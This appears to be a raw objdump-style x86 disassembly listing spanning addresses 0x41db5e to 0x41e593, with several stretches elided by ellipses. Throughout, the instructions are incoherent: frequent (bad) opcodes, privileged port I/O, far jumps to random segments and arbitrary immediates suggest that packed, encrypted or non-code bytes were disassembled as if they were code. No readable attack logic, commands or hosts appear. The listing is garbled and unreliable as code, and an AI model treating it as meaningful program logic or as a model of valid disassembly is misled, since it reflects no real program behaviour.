  41db5e:	jns    0x41dbc9
  41db60:	xor    eax,DWORD PTR [edx]
  41db62:	lock outs dx,BYTE PTR ds:[esi]
  41db64:	dec    ebp
  41db65:	add    DWORD PTR [edi+0x7],0x6b
  41db69:	lds    ebx,FWORD PTR [edx-0x5ab42154]
  41db6f:	into   
  41db70:	(bad)  
  41db71:	fisub  DWORD PTR [edx-0x304a0955]
  41db77:	push   ebp
  41db78:	aam    0xc6
  41db7a:	jge    0x41dbf9
  41db7c:	push   ss
  41db7d:	dec    eax
  41db7e:	out    dx,eax
  41db7f:	push   ecx
  41db80:	inc    edx
  41db81:	repnz sbb bl,dl
  41db84:	loope  0x41dbae
  41db86:	sbb    ebp,esi
  41db88:	ja     0x41dbae
  41db8a:	push   ecx
  41db8b:	adc    BYTE PTR [esi+ebp*1+0x19],ch
  41db8f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41db90:	push   ebx
  41db92:	xor    ebx,eax
  41db94:	iret   
  41db95:	dec    edx
  41db96:	jl     0x41dbc3
  41db98:	sbb    BYTE PTR [ebp-0x1fb8e6a],ah
  41db9e:	sbb    eax,DWORD PTR [edi+ebx*1]
  41dba1:	inc    ebx
  41dba2:	jmp    0x41dbd0
  41dba4:	mov    eax,ds:0x5c0aef15
  41dba9:	outs   dx,BYTE PTR ds:[esi]
  41dbaa:	sbb    BYTE PTR [edx-0x62],bl
  41dbad:	mov    cl,0x65
  41dbaf:	fsubr  DWORD PTR [edi+edx*8+0x3c87c5]
  41dbb6:	loope  0x41dc1d
  41dbb8:	or     dl,BYTE PTR [ecx]
  41dbba:	cmp    ecx,DWORD PTR [ecx-0x7d291d46]
  41dbc0:	sub    BYTE PTR [ecx-0x70],0x8a
  41dbc4:	leave  
  41dbc5:	shl    BYTE PTR [edx],cl
  41dbc7:	inc    esp
  41dbc8:	jl     0x41db53
  41dbca:	push   0xffffffb3
  41dbcc:	mov    eax,ds:0xbe242b58
  41dbd1:	shr    DWORD PTR [edx+0x3d],0x67
  41dbd5:	xchg   esp,eax
  41dbd6:	mov    cl,BYTE PTR [eax+0x60643c70]
  41dbdc:	xchg   edx,eax
  41dbdd:	ss jl  0x41dc25
  41dbe0:	sub    al,0x3e
  41dbe2:	xor    al,0xe7
  41dbe4:	imul   edi,DWORD PTR [edi+0x1a],0x759d109d
  41dbeb:	adc    DWORD PTR [ecx-0x5caa7ea8],esp
  41dbf1:	dec    eax
  41dbf2:	jecxz  0x41dc1f
  41dbf4:	adc    ecx,DWORD PTR [ebx]
  41dbf6:	leave  
  41dbf7:	in     eax,dx
  41dbf8:	push   esi
  41dbf9:	adc    eax,0xd0c7e7a
  41dbfe:	xlat   BYTE PTR ds:[ebx]
  41dbff:	out    dx,al
  41dc00:	jecxz  0x41dc1c
  41dc02:	mov    eax,ds:0x59452791
  41dc07:	mov    ah,0x9f
  41dc09:	mov    edi,0xa7760b50
  41dc0e:	enter  0xd6,0x0
	...
  41dc72:	add    BYTE PTR [eax],al
  41dc74:	outs   dx,DWORD PTR ds:[esi]
  41dc75:	retf   0x9815
  41dc78:	mov    ch,0xdf
  41dc7a:	out    dx,eax
  41dc7b:	jmp    DWORD PTR [edi+0x12b0d050]
  41dc81:	adc    ch,BYTE PTR [esi+0x13c8083]
  41dc87:	add    BYTE PTR [ecx+eax*1],al
  41dc8a:	add    BYTE PTR [eax],al
  41dc8c:	lock jb 0x41dcf7
  41dc8f:	mov    ebp,0xb5fca326
  41dc94:	dec    ebx
  41dc95:	fsub   QWORD PTR [eax]
  41dc97:	jne    0x41dd07
  41dc99:	fwait
  41dc9a:	bound  esp,QWORD PTR [ecx]
  41dc9c:	xchg   edx,eax
  41dc9d:	lock or DWORD PTR [edx-0x74],edi
  41dca1:	mov    al,0xf0
  41dca3:	test   BYTE PTR [edx],dl
  41dca5:	outs   dx,BYTE PTR ds:[esi]
  41dca6:	imul   ebx,DWORD PTR [ecx-0x70],0xffffffcc
  41dcaa:	jns    0x41dc4f
  41dcac:	jp     0x41dd12
  41dcae:	jnp    0x41dcc2
  41dcb0:	ss mov ebx,0x4f26dcf8
  41dcb6:	mov    esp,0x5e5120f2
  41dcbb:	sahf   
  41dcbc:	mov    DWORD PTR [edx],esi
  41dcbe:	adc    al,0x7
  41dcc0:	xchg   esi,eax
  41dcc1:	push   ebx
  41dcc2:	jmp    0xd75b:0x57dabae9
  41dcc9:	pop    ebx
  41dcca:	leave  
  41dccb:	iret   
  41dccc:	mov    dh,0xd6
  41dcce:	shl    DWORD PTR [ebp+0x664dbbcf],1
  41dcd4:	mov    ch,BYTE PTR ds:0xc89174c0
  41dcda:	add    dh,BYTE PTR ds:0x1ea3bf3f
  41dce0:	mov    bh,BYTE PTR [esi-0x2b]
  41dce3:	push   cs
  41dce4:	aaa    
  41dce5:	loop   0x41dc9e
  41dce7:	pop    esi
  41dce8:	add    edx,esi
  41dcea:	dec    edx
  41dceb:	fld    QWORD PTR [eax]
  41dced:	nop
  41dcee:	xor    eax,0x7903b4c4
  41dcf3:	mov    dh,0x58
  41dcf5:	lods   al,BYTE PTR ds:[esi]
  41dcf6:	add    eax,0x8a648975
  41dcfb:	xlat   BYTE PTR ds:[ebx]
  41dcfc:	push   eax
  41dcfd:	pusha  
  41dcfe:	sub    ah,ch
  41dd00:	jo     0x41dd79
  41dd02:	pop    eax
  41dd03:	shl    DWORD PTR [ebx-0x5d],1
  41dd06:	mov    DWORD PTR [edx+0x55],0x4343ddad
  41dd0d:	or     BYTE PTR [esi+0x2a853b9a],bl
  41dd13:	mov    ds:0xb1ccdbea,eax
  41dd18:	jnp    0x41dcf1
  41dd1a:	sub    ebx,0xc233ce48
  41dd20:	or     al,0xf4
  41dd22:	rcl    DWORD PTR [ebx+0x3d70a774],0x40
  41dd29:	inc    esi
  41dd2a:	jbe    0x41dcb4
  41dd2c:	inc    edi
  41dd2d:	cmp    al,0xf6
  41dd2f:	adc    eax,0xb6310f53
  41dd34:	loope  0x41dd9e
  41dd36:	setl   BYTE PTR [edi-0x24f8259f]
  41dd3d:	scas   al,BYTE PTR es:[edi]
  41dd3e:	fiadd  WORD PTR [ecx-0x10]
  41dd41:	shl    bh,1
  41dd43:	cwde   
  41dd44:	popa   
  41dd45:	xchg   BYTE PTR [edx],bl
  41dd47:	cmp    bl,dl
  41dd49:	cmp    DWORD PTR [esi],edx
  41dd4b:	push   es
  41dd4c:	lock fstp TBYTE PTR [edi]
  41dd4f:	mov    fs,ebp
  41dd51:	mov    edi,0xd3e44f8f
  41dd56:	fs idiv esp
  41dd59:	jge    0x41dd90
  41dd5b:	out    dx,al
  41dd5c:	out    dx,al
  41dd5d:	outs   dx,DWORD PTR ds:[esi]
  41dd5e:	add    esi,ebp
  41dd60:	pop    esi
  41dd61:	call   0xb134:0x2b97205e
  41dd68:	fs test al,0x43
  41dd6b:	mov    edi,0x6be7f8fd
  41dd70:	cs jmp 0xbeb99d5c
  41dd76:	push   ebp
  41dd77:	mov    al,ds:0x89327d2
  41dd7c:	xor    al,ah
  41dd7e:	cmp    DWORD PTR [edi+0x122f2574],ebp
  41dd84:	push   ebx
  41dd85:	retf   
  41dd86:	inc    edx
  41dd87:	(bad)  
  41dd88:	mov    dl,0xf7
  41dd8a:	inc    ebp
  41dd8b:	inc    ebx
  41dd8c:	pop    esp
  41dd8d:	add    al,0xeb
	...
  41ddf4:	and    bl,dh
  41ddf6:	das    
  41ddf7:	cmp    bh,0xde
  41ddfa:	lods   eax,DWORD PTR ds:[esi]
  41ddfb:	repz pop ds
  41ddfd:	mov    bl,BYTE PTR [esi-0x41]
  41de00:	(bad)  
  41de01:	enter  0x6e1f,0x84
  41de05:	cmp    eax,0x1040001
  41de0a:	add    BYTE PTR [eax],al
  41de0c:	push   eax
  41de0d:	enter  0xf1c8,0x72
  41de11:	aam    0xbb
  41de13:	inc    ecx
  41de14:	mov    edi,0xd4977720
  41de19:	add    al,0x7b
  41de1b:	add    eax,edx
  41de1d:	xchg   ebp,eax
  41de1e:	test   eax,0x8eb3f95e
  41de23:	dec    eax
  41de24:	(bad)  
  41de25:	scas   eax,DWORD PTR es:[edi]
  41de26:	mov    esp,0xa3ad0466
  41de2b:	adc    DWORD PTR [ebp-0x5e01e26],0x21
  41de32:	mov    ebp,0x95824f6f
  41de37:	(bad)  
  41de38:	mov    esp,0x50ae3ed
  41de3d:	jno    0x41ddf2
  41de3f:	ss ret 
  41de41:	sub    eax,edx
  41de43:	mov    cl,BYTE PTR [eax-0xf]
  41de46:	xchg   cl,bh
  41de48:	int    0x60
  41de4a:	xchg   edi,eax
  41de4b:	test   al,0x1a
  41de4d:	pop    eax
  41de4e:	sbb    bh,BYTE PTR [ecx-0xe21f515]
  41de54:	xchg   BYTE PTR [ebp-0x43af9fcf],cl
  41de5a:	adc    cl,BYTE PTR [ebx]
  41de5c:	pushf  
  41de5d:	mov    esp,0x9b726f01
  41de62:	inc    edi
  41de63:	out    0x10,al
  41de65:	push   edi
  41de66:	outs   dx,DWORD PTR ds:[esi]
  41de67:	push   edx
  41de68:	jbe    0x41de09
  41de6a:	pop    esi
  41de6b:	push   ebx
  41de6c:	ret    0xe704
  41de6f:	in     eax,0xe0
  41de71:	fild   WORD PTR [eax-0x24]
  41de74:	adc    DWORD PTR [ebp+0x12],edx
  41de77:	jmp    0x313f:0xb4ea841a
  41de7e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41de7f:	sbb    al,0x97
  41de81:	ret    
  41de82:	mov    cl,0xdf
  41de84:	mov    eax,ds:0x86486c8
  41de89:	fistp  QWORD PTR [esp+edi*4+0x6399d3f2]
  41de90:	fld    TBYTE PTR [ebx+0x3b]
  41de93:	test   al,0x4b
  41de95:	mov    al,ds:0x6de36aa7
  41de9a:	in     eax,dx
  41de9b:	inc    esp
  41de9c:	xor    al,0x3c
  41de9e:	pop    ebx
  41de9f:	repz push cs
  41dea1:	sti    
  41dea2:	es jecxz 0x41de3e
  41dea5:	arpl   di,si
  41dea7:	xchg   edi,eax
  41dea8:	loopne 0x41de7b
  41deaa:	leave  
  41deab:	or     al,0x50
  41dead:	jmp    0x41de37
  41deaf:	push   0x550b56bc
  41deb4:	ss mov esp,edi
  41deb7:	push   ebp
  41deb8:	xchg   edx,eax
  41deb9:	mov    esp,0xf4a30f9b
  41debe:	out    dx,al
  41debf:	out    dx,eax
  41dec0:	dec    ebx
  41dec1:	ins    BYTE PTR es:[edi],dx
  41dec2:	fldenv ds:0x2ff6fbac
  41dec8:	sub    al,0x52
  41deca:	(bad)  
  41decc:	xor    al,0x6c
  41dece:	jbe    0x41df1d
  41ded0:	adc    al,0x76
  41ded2:	int    0x40
  41ded4:	jp     0x41deb6
  41ded6:	mov    gs:0x5ee38872,al
  41dedc:	popf   
  41dedd:	or     DWORD PTR [edx+edx*1-0x55],0xffffff84
  41dee2:	jnp    0x41df24
  41dee4:	loopne 0x41df31
  41dee6:	das    
  41dee7:	nop
  41dee8:	out    0x64,eax
  41deea:	xchg   ebp,eax
  41deeb:	sub    al,bh
  41deed:	jo     0x41debf
  41deef:	inc    edi
  41def0:	mov    cl,0xfe
  41def2:	mov    BYTE PTR [ebx-0x5],al
  41def5:	or     BYTE PTR [esi+edi*8-0x763f2745],bh
  41defc:	fsub   QWORD PTR [edx+0x52]
  41deff:	mov    al,0xe1
  41df01:	mov    al,ds:0xd5f3f131
  41df06:	pop    edx
  41df07:	or     BYTE PTR [edx-0x6],ah
  41df0a:	sub    BYTE PTR [esi-0x4d],al
  41df0d:	dec    edi
  41df0e:	mov    dh,0x3a
	...
  41df74:	aas    
  41df75:	daa    
  41df76:	push   ss
  41df77:	cld    
  41df78:	push   ds
  41df79:	std    
  41df7a:	jmp    edi
  41df7c:	dec    edi
  41df7d:	push   0x73f09ce9
  41df82:	push   0xffffffbd
  41df84:	mov    BYTE PTR [esi],bh
  41df86:	add    DWORD PTR [eax],eax
  41df88:	add    al,0x1
  41df8a:	add    BYTE PTR [eax],al
  41df8c:	and    BYTE PTR [ebp-0x1ef63892],ch
  41df92:	jle    0x41df40
  41df94:	mov    esi,0x27c60452
  41df99:	das    
  41df9a:	dec    eax
  41df9b:	mov    dh,ch
  41df9d:	sub    BYTE PTR [edi+esi*2],bh
  41dfa0:	dec    ecx
  41dfa1:	and    eax,0xa43dd093
  41dfa6:	rcl    BYTE PTR [edx],cl
  41dfa8:	mov    ds:0x68f48cb,eax
  41dfad:	pop    ebp
  41dfae:	pop    ebx
  41dfaf:	adc    dl,BYTE PTR ds:0xa94e8a03
  41dfb5:	jne    0x41e01b
  41dfb7:	mov    dh,0x8b
  41dfb9:	nop
  41dfba:	sub    DWORD PTR [ebx+0x63],0x35
  41dfbe:	inc    edx
  41dfbf:	xor    eax,0x36f4fb4a
  41dfc4:	into   
  41dfc5:	dec    edi
  41dfc6:	sub    BYTE PTR [ecx-0x19],dl
  41dfc9:	mov    al,ds:0x61554a45
  41dfce:	int3   
  41dfcf:	fadd   QWORD PTR [ebx+eax*2]
  41dfd2:	and    ebp,ebx
  41dfd4:	xor    al,BYTE PTR [ecx+0x28]
  41dfd7:	cli    
  41dfd8:	into   
  41dfd9:	mov    cl,0x87
  41dfdb:	xor    al,0xea
  41dfdd:	fidiv  DWORD PTR [ecx-0x31]
  41dfe0:	or     al,0x2a
  41dfe2:	push   eax
  41dfe3:	(bad)  
  41dfe4:	test   al,0x2e
  41dfe6:	sbb    al,0x28
  41dfe8:	das    
  41dfe9:	(bad)  
  41dfea:	and    BYTE PTR [edx-0x6df57c3c],al
  41dff0:	in     eax,0x22
  41dff2:	lods   eax,DWORD PTR ds:[esi]
  41dff3:	mov    ds:0x6f336a7a,al
  41dff8:	push   ds
  41dff9:	adc    DWORD PTR [esi],ebx
  41dffb:	xchg   esi,eax
  41dffc:	xchg   ebx,eax
  41dffd:	arpl   WORD PTR [ecx+edi*8+0x45],sp
  41e001:	xchg   DWORD PTR [edi+0x20],ebx
  41e004:	ficomp WORD PTR [edi]
  41e006:	jmp    0xa4e5a1d6
  41e00b:	pushf  
  41e00c:	daa    
  41e00d:	fs loop 0x41e049
  41e010:	sub    al,0xb1
  41e012:	repz jns 0x41e087
  41e015:	fstp   QWORD PTR [ecx-0x71]
  41e018:	test   al,0x27
  41e01a:	jbe    0x41e000
  41e01c:	mov    ebp,0xc3ef4f1b
  41e021:	ret    0xa47f
  41e024:	pop    ss
  41e025:	jecxz  0x41dfb6
  41e027:	ret    
  41e028:	call   0x5b58:0xcc691e22
  41e02f:	fidivr WORD PTR [ebx-0x5d]
  41e032:	fs aad 0x57
  41e035:	xchg   ebx,eax
  41e036:	fs stc 
  41e038:	(bad)  
  41e03a:	inc    ebx
  41e03b:	xchg   DWORD PTR [esi],esi
  41e03d:	std    
  41e03e:	test   BYTE PTR [edx+ebp*8],cl
  41e041:	ins    BYTE PTR es:[edi],dx
  41e042:	lea    eax,[eax+0x7e639233]
  41e048:	jo     0x41dff9
  41e04a:	aaa    
  41e04b:	imul   dh
  41e04d:	pop    ss
  41e04e:	pop    edi
  41e04f:	xchg   ebx,eax
  41e050:	jp     0x41e043
  41e052:	add    BYTE PTR [esi],dl
  41e054:	inc    edi
  41e055:	imul   edx,DWORD PTR [edi-0x69d3e629],0xffffffb9
  41e05c:	leave  
  41e05d:	jg     0x41dfe3
  41e05f:	sbb    bl,bl
  41e061:	sbb    eax,0x5a35bcdd
  41e066:	call   0x671d:0xe1e5497a
  41e06d:	ficomp WORD PTR [esi-0x794f9492]
  41e073:	mov    eax,ds:0x806ed5ed
  41e078:	fs xor al,0x65
  41e07b:	add    DWORD PTR [eax+ebp*4+0x79],ebp
  41e07f:	ins    DWORD PTR es:[edi],dx
  41e080:	lahf   
  41e081:	xor    edx,DWORD PTR [eax]
  41e083:	jle    0x41e07e
  41e085:	mov    al,ds:0x8d59bb08
  41e08a:	nop
  41e08b:	adc    eax,0x2ab261dc
	...
  41e0f4:	dec    edi
  41e0f5:	push   ebx
  41e0f6:	add    al,0xc
  41e0f8:	sbb    al,0x5f
  41e0fa:	dec    edi
  41e0fb:	push   ebx
  41e0fc:	out    0x6d,eax
  41e0fe:	aad    0x48
  41e100:	imul   ebx,DWORD PTR ds:0x3f8c133f,0x1040001
  41e10a:	add    BYTE PTR [eax],al
  41e10c:	or     edx,edi
  41e10e:	cld    
  41e10f:	js     0x41e0a1
  41e111:	das    
  41e112:	call   0xcaf8:0x8398682e
  41e119:	xchg   ebp,eax
  41e11a:	adc    ebp,DWORD PTR [ebp+0x297ef762]
  41e120:	ds retf 
  41e122:	hlt    
  41e123:	add    DWORD PTR [ecx+0x29],eax
  41e126:	clc    
  41e127:	cmp    cl,BYTE PTR [edx]
  41e129:	push   ebx
  41e12a:	je     0x41e156
  41e12c:	mov    al,0x5f
  41e12e:	jmp    0x41e162
  41e130:	sbb    ecx,eax
  41e132:	je     0x41e1a3
  41e134:	out    dx,eax
  41e135:	and    al,0xfe
  41e137:	xor    ecx,DWORD PTR [ebp+0x1b9f0ee7]
  41e13d:	cmc    
  41e13e:	dec    ebp
  41e13f:	add    edx,eax
  41e141:	or     edi,ebp
  41e143:	aas    
  41e144:	sar    DWORD PTR [edi+esi*8+0x2f],1
  41e148:	ins    BYTE PTR es:[edi],dx
  41e149:	push   edi
  41e14a:	(bad)  
  41e14b:	adc    edi,DWORD PTR [edi+0x50181101]
  41e151:	scas   eax,DWORD PTR es:[edi]
  41e152:	mov    al,ds:0x3cf0c133
  41e157:	mov    BYTE PTR [edi],ch
  41e159:	or     eax,0xe0ba9ac8
  41e15e:	push   es
  41e15f:	lods   eax,DWORD PTR ds:[esi]
  41e160:	inc    edx
  41e161:	int3   
  41e162:	pop    edi
  41e163:	dec    edi
  41e165:	sbb    al,BYTE PTR [eax+0x3d]
  41e168:	mov    esi,0x279c282e
  41e16d:	pop    es
  41e16e:	add    eax,0xc65af59a
  41e173:	(bad)  
  41e174:	lods   al,BYTE PTR ds:[esi]
  41e175:	jnp    0x41e1ef
  41e177:	push   edx
  41e178:	lock scas eax,DWORD PTR es:[edi]
  41e17a:	jno    0x41e1aa
  41e17c:	jne    0x41e12b
  41e17e:	inc    esp
  41e17f:	xchg   ebx,eax
  41e180:	dec    edi
  41e181:	pop    edi
  41e182:	push   es
  41e183:	add    DWORD PTR [ebp-0x57],ecx
  41e186:	jne    0x41e202
  41e188:	mov    ebp,0x82435f38
  41e18d:	clc    
  41e18e:	add    al,BYTE PTR [edi]
  41e190:	jnp    0x41e1e1
  41e192:	retf   
  41e193:	pop    ecx
  41e194:	pop    esp
  41e195:	sub    al,0x27
  41e197:	xchg   DWORD PTR [edi+eax*4+0x30],ecx
  41e19b:	jp     0x41e1e4
  41e19d:	xchg   esp,eax
  41e19e:	xchg   ebx,eax
  41e19f:	sub    eax,0xec466d18
  41e1a4:	repz xchg ebp,eax
  41e1a6:	mov    esi,0xd67e80c2
  41e1ab:	(bad)  
  41e1ac:	cmp    DWORD PTR [edx+0x7b3407f7],esi
  41e1b2:	je     0x41e233
  41e1b4:	jno    0x41e1ad
  41e1b6:	stos   DWORD PTR es:[edi],eax
  41e1b7:	pop    ds
  41e1b8:	fidivr DWORD PTR [edx+0x32c2a777]
  41e1be:	fild   QWORD PTR [ecx+0x72589e2c]
  41e1c4:	pop    ebp
  41e1c5:	sahf   
  41e1c6:	mov    ch,0xf9
  41e1c8:	(bad)  
  41e1c9:	in     eax,dx
  41e1ca:	rcl    WORD PTR [eax],cl
  41e1cd:	mov    es,WORD PTR [ebx]
  41e1cf:	xor    eax,0xc48a318d
  41e1d4:	xchg   BYTE PTR [edx],dh
  41e1d6:	mov    al,ds:0x2b3fb044
  41e1db:	pop    ds
  41e1dc:	xor    eax,0x5b8504b9
  41e1e1:	xchg   edx,eax
  41e1e2:	xor    BYTE PTR [ebp-0x44],0x84
  41e1e6:	hlt    
  41e1e7:	pop    es
  41e1e8:	mov    WORD PTR [ecx+0x72f316c9],ss
  41e1ee:	push   edx
  41e1ef:	stc    
  41e1f0:	adc    al,0x56
  41e1f2:	cld    
  41e1f3:	cs cli 
  41e1f5:	and    ebx,ecx
  41e1f7:	jb     0x41e1cb
  41e1f9:	or     BYTE PTR [edx+0x17],bh
  41e1fc:	fsubrp st(0),st
  41e1fe:	dec    esp
  41e1ff:	and    al,0x61
  41e201:	sub    BYTE PTR [edx-0x43],ch
  41e204:	mov    bh,ah
  41e206:	std    
  41e207:	jne    0x41e273
  41e209:	aam    0x3d
  41e20b:	sub    ch,ch
  41e20d:	sub    eax,0x6981
	...
  41e272:	add    BYTE PTR [eax],al
  41e274:	stos   DWORD PTR es:[edi],eax
  41e275:	add    dh,BYTE PTR [edi-0x1a]
  41e278:	push   edi
  41e27a:	mov    ebx,0x6f64c34f
  41e27f:	or     al,0xe7
  41e281:	rdpmc  
  41e283:	pause  
  41e285:	inc    eax
  41e286:	add    DWORD PTR [eax],eax
  41e288:	add    al,0x1
  41e28a:	add    BYTE PTR [eax],al
  41e28c:	lea    eax,[edx-0x1c35d267]
  41e292:	int    0x19
  41e294:	arpl   WORD PTR [eax+0x3b],cx
  41e297:	mov    al,ds:0x1e4f04b9
  41e29c:	(bad)  
  41e29d:	in     eax,0x61
  41e29f:	mov    esp,ds
  41e2a1:	or     eax,0x9ed51dab
  41e2a6:	jle    0x41e284
  41e2a8:	pop    ebx
  41e2a9:	inc    edx
  41e2aa:	mov    dh,bh
  41e2ac:	repz cmp eax,0x2f8ab2f4
  41e2b2:	or     BYTE PTR [edx-0x22f91864],ch
  41e2b8:	loope  0x41e279
  41e2ba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e2bb:	xchg   DWORD PTR [ebp+0x35],ebp
  41e2be:	or     DWORD PTR [eax],0xb7c3415e
  41e2c4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e2c5:	xor    ebp,DWORD PTR [edi]
  41e2c7:	data16 fstp QWORD PTR [eax]
  41e2ca:	inc    edi
  41e2cb:	hlt    
  41e2cc:	dec    edi
  41e2cd:	mov    bl,0x1d
  41e2cf:	ja     0x41e292
  41e2d1:	inc    BYTE PTR [eax]
  41e2d3:	xchg   esp,eax
  41e2d4:	(bad)  
  41e2d5:	icebp  
  41e2d6:	mov    bh,0xb4
  41e2d8:	les    ebx,FWORD PTR [edi-0x43]
  41e2db:	jmp    0x48e7:0x4b750099
  41e2e2:	sbb    al,0x48
  41e2e4:	test   BYTE PTR [edx+0x16c6f2ff],bl
  41e2ea:	mov    ds:0xd001fcdd,eax
  41e2ef:	pop    edi
  41e2f0:	mov    dl,0x45
  41e2f2:	pop    esi
  41e2f3:	mov    eax,DWORD PTR [ecx]
  41e2f5:	pop    ecx
  41e2f6:	mov    WORD PTR [esi],?
  41e2f8:	sti    
  41e2f9:	mov    al,ds:0xdbe0167e
  41e2fe:	add    eax,0xffffff87
  41e301:	popa   
  41e302:	(bad)  
  41e303:	jmp    0x4b62c682
  41e308:	repnz in al,dx
  41e30a:	lods   eax,DWORD PTR ds:[esi]
  41e30b:	iret   
  41e30c:	stos   DWORD PTR es:[edi],eax
  41e30d:	cmc    
  41e30e:	xchg   ebx,eax
  41e30f:	iret   
  41e310:	ss jb  0x41e304
  41e313:	or     ebx,DWORD PTR [ebp+edi*1+0x2f675fb0]
  41e31a:	dec    esi
  41e31b:	es and eax,0xe7d92d98
  41e321:	stc    
  41e322:	adc    eax,0xcd658ca0
  41e327:	dec    edi
  41e328:	jle    0x41e2cc
  41e32a:	pop    esp
  41e32b:	pop    edx
  41e32c:	fdiv   st,st(3)
  41e32e:	or     ebp,DWORD PTR [edi+0x2b]
  41e331:	jmp    0x41e316
  41e333:	out    0xe7,eax
  41e335:	loopne 0x41e33a
  41e337:	in     eax,0x30
  41e339:	push   edx
  41e33a:	cmp    dh,al
  41e33c:	hlt    
  41e33d:	fcom   QWORD PTR [edx-0x2a468380]
  41e343:	retf   0x4db5
  41e346:	iret   
  41e347:	(bad)  
  41e348:	mov    esp,0x7e640b56
  41e34d:	mov    cl,0x79
  41e34f:	lahf   
  41e350:	cmp    esi,0xffffffaa
  41e353:	add    eax,0x24da0e5b
  41e358:	aad    0x99
  41e35a:	es cli 
  41e35c:	mov    cs,eax
  41e35e:	ss data16 jg 0x41e32f
  41e362:	push   0xfd3df9e5
  41e367:	jb     0x41e3a8
  41e369:	loope  0x41e364
  41e36b:	sar    BYTE PTR [ecx+0x21],1
  41e36e:	dec    eax
  41e36f:	cmp    edx,ebp
  41e371:	dec    esi
  41e372:	shr    DWORD PTR [edx],0xd4
  41e375:	xor    edi,ecx
  41e377:	jns    0x41e35f
  41e379:	push   cs
  41e37a:	aaa    
  41e37b:	(bad)  
  41e37c:	in     al,dx
  41e37d:	int    0xd3
  41e37f:	jle    0x41e3f1
  41e381:	xor    DWORD PTR [eax*4-0xde2975],0xffffff8e
  41e389:	and    DWORD PTR [ebp-0xf392d06],esp
  41e38f:	pop    esp
	...
  41e3f4:	mov    DWORD PTR [edx],edx
  41e3f6:	ja     0x41e417
  41e3f8:	(bad)  
  41e3f9:	jg     0x41e3e4
  41e3fb:	xchg   esi,eax
  41e3fc:	or     DWORD PTR [edx+0x18],0x1d0fda09
  41e403:	aas    
  41e404:	xchg   esp,eax
  41e405:	inc    ecx
  41e406:	add    DWORD PTR [eax],eax
  41e408:	add    al,0x1
  41e40a:	add    BYTE PTR [eax],al
  41e40c:	mov    bl,BYTE PTR [ecx+0x46]
  41e40f:	mov    ebx,0xfde1ba2f
  41e414:	mov    ebx,0xa6a93656
  41e419:	add    dh,dh
  41e41b:	test   eax,0xbe014c2e
  41e420:	or     DWORD PTR [esi+esi*8+0x4a],ecx
  41e424:	cs add eax,0xf0c7e37
  41e42a:	xchg   DWORD PTR [edi+0x4d],edi
  41e42d:	dec    esi
  41e42e:	aam    0xd8
  41e430:	sub    al,0x2e
  41e432:	stos   BYTE PTR es:[edi],al
  41e433:	sub    DWORD PTR ds:0xa56aa3b0,ebx
  41e439:	repnz test al,0xfd
  41e43c:	(bad)  
  41e43e:	call   0xc7dc:0xbb4c587d
  41e445:	pop    esi
  41e446:	pop    ss
  41e447:	cmc    
  41e448:	xor    DWORD PTR [ecx-0x6046314c],esi
  41e44e:	lods   eax,DWORD PTR ds:[esi]
  41e44f:	jno    0x41e3ff
  41e451:	mov    esi,0x1fd2807e
  41e456:	cmp    esi,DWORD PTR ds:0xae9a11f2
  41e45c:	pop    ds
  41e45d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e45e:	bound  edx,QWORD PTR [edi+esi*2+0xc]
  41e462:	push   ecx
  41e463:	inc    esi
  41e464:	jl     0x41e4d3
  41e466:	daa    
  41e467:	aad    0x10
  41e469:	adc    eax,0x8d0b5845
  41e46e:	or     cl,BYTE PTR [ebx+0x2be5d9dd]
  41e474:	test   DWORD PTR [edi+0x43d66882],esp
  41e47a:	fdiv   DWORD PTR [edi+0x46a45245]
  41e480:	fcmovu st,st(5)
  41e482:	xor    al,0x35
  41e484:	xchg   esp,eax
  41e485:	ja     0x41e486
  41e487:	add    al,0xc7
  41e489:	and    al,0xfd
  41e48b:	pop    ebp
  41e48c:	ss adc eax,0x3491ea5d
  41e492:	pop    ds
  41e493:	jl     0x41e4bb
  41e495:	jmp    0x7fbc:0x657dc925
  41e49c:	imul   eax,DWORD PTR [ecx+0x1b01029b],0x77
  41e4a3:	popf   
  41e4a4:	mov    dh,0x71
  41e4a6:	cmp    eax,0xa6ceb9c9
  41e4ab:	push   ecx
  41e4ac:	inc    esi
  41e4ad:	retf   0xe72b
  41e4b0:	add    ecx,DWORD PTR [ebx+ecx*1]
  41e4b3:	loop   0x41e502
  41e4b5:	nop
  41e4b6:	in     al,0x8c
  41e4b8:	jp     0x41e4f3
  41e4ba:	je     0x41e48b
  41e4bc:	je     0x41e524
  41e4be:	mov    eax,esp
  41e4c0:	sti    
  41e4c1:	sbb    DWORD PTR [edi-0x38],esi
  41e4c4:	test   al,0x9b
  41e4c6:	fsub   QWORD PTR [esp+ebp*4]
  41e4c9:	pop    ss
  41e4ca:	and    DWORD PTR [edx+0xe],edx
  41e4cd:	add    DWORD PTR ds:0xc2be189c,esi
  41e4d3:	or     eax,DWORD PTR [edi-0x44162ddb]
  41e4d9:	push   ecx
  41e4da:	fadd   DWORD PTR [ecx]
  41e4dc:	mov    dl,0x17
  41e4de:	xor    ebx,DWORD PTR [edx-0x79]
  41e4e1:	dec    edi
  41e4e2:	jg     0x41e4ac
  41e4e4:	add    eax,0x41126fe5
  41e4e9:	or     BYTE PTR [edi-0x417cb84a],0x70
  41e4f0:	cdq    
  41e4f1:	mov    cl,0x3
  41e4f3:	push   cs
  41e4f4:	ins    DWORD PTR es:[edi],dx
  41e4f5:	push   0x5b
  41e4f7:	adc    al,0x42
  41e4f9:	int3   
  41e4fa:	xchg   ebx,eax
  41e4fb:	js     0x41e56a
  41e4fd:	ret    
  41e4fe:	or     eax,0x35de72bf
  41e503:	retf   0xe8b3
  41e506:	xor    DWORD PTR [edi+0x3b],esp
  41e509:	xchg   ebx,eax
  41e50a:	push   0x1e
  41e50c:	xor    al,BYTE PTR [ecx+0x2f]
  41e50f:	cli    
	...
  41e574:	and    BYTE PTR [edx-0x35],ch
  41e577:	dec    ebx
  41e578:	retf   
  41e579:	jmp    0x41e51b
  41e57b:	imul   ebp,ebx,0xffffffb1
  41e57e:	aaa    
  41e57f:	je     0x41e580
  41e581:	mov    WORD PTR [esi],?
  41e583:	mov    eax,ds:0x14298
  41e588:	add    al,0x1
  41e58a:	add    BYTE PTR [eax],al
  41e58c:	and    cl,BYTE PTR [edi]
  41e58e:	repnz cld 
  41e590:	mov    bl,0x46
  41e592:	clc    
  41e593:	mov    bl,0x21
